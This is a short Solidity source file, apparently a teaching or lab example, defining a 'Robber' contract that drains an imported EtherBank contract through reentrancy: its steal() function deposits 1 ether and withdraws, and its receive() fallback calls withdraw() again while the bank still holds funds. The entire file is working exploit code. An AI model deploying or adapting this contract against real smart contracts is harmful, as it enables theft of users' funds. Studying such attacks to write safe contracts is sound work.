// SPDX-License-Identifier: MIT
pragma solidity 0.8.22;

import "./EtherBank.sol";

contract Robber {
    EtherBank public etherBank;
    event ReceivedEth(uint256 amount);

    uint256 public constant AMOUNT = 1 ether;

    constructor(address _etherBankAddress) {
        etherBank = EtherBank(_etherBankAddress);
    }

    receive() external payable {
        if (address(etherBank).balance > AMOUNT) {
            etherBank.withdraw();
        }
    }

    function steal() external payable {
        require(msg.value > AMOUNT);
        etherBank.deposit{value: AMOUNT}();
        etherBank.withdraw();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
